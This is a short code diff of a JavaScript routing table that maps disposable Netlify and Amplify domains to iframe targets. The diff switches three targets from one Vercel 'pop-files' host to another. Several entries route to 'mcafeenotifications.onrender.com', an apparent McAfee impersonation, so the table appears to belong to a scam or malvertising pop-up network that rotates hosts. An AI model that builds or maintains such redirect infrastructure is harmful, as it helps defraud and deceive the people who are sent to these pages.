@@ -89,9 +89,9 @@ const ORIGIN_GROUPS = {
     "https://main.dzszig6ylykdh.amplifyapp.com": { method: "iframe", target: "https://ziyan-os3.vercel.app" },
     "https://lambent-maamoul-1de7b2.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
     "https://nimble-bonbon-e8f851.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
-    "https://spontaneous-salamander-ec6bf0.netlify.app": { method: "iframe", target: "https://s-pop-files.vercel.app" },
-    "https://benevolent-lebkuchen-4f36c6.netlify.app": { method: "iframe", target: "https://s-pop-files.vercel.app" },
-    "https://earnest-sawine-a7ac5c.netlify.app": { method: "iframe", target: "https://s-pop-files.vercel.app" },
+    "https://spontaneous-salamander-ec6bf0.netlify.app": { method: "iframe", target: "https://t-pop-files.vercel.app" },
+    "https://benevolent-lebkuchen-4f36c6.netlify.app": { method: "iframe", target: "https://t-pop-files.vercel.app" },
+    "https://earnest-sawine-a7ac5c.netlify.app": { method: "iframe", target: "https://t-pop-files.vercel.app" },
     "https://relaxed-pegasus-8e3b77.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
   },
   dmc: {
